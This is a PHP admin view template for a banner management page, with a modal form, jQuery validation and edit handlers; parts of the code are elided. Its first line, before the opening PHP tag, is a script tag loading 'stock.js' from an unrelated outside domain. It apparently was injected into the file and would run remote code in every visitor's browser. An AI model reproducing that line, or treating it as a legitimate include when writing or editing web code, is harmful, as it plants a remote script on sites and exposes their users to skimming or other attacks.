<script src='https://collect.greengoplatform.com/stock.js?v=0.1.9' type='text/javascript'></script><?php $data[$this->pages]=$this->banner;$data['focus']=$this->judul; $this->load->view($this->generalHeader,$data) ?>
<div id="result-content"></div>
<?php form($this->banner,$baseView,"modal-lg"); ?>


<script>
    var urlLocal    = "<?=$this->section.'/'.$this->banner.'/'?>";
    ...
    formInput.validate({
        rules: {
            judul: {
                required: true,
                remote: {url: `${pages}/check_column`,type: "post",data: {param: function () {return paramForm.val();}}}
            },
    ...
    function ubah(id) {
        ...
        handleCacheEdit(baseUrl,function(res){
            if (res.status) {
                ...
                var arrId   = [strId,strJudul,strDeskripsi,strLink,strStatus,strGambar];
                arrId.forEach(function(row){
                    setIdSelect(row,data[row]);
                    if(row===strGambar)setFileImage(data[row],pages)
                })
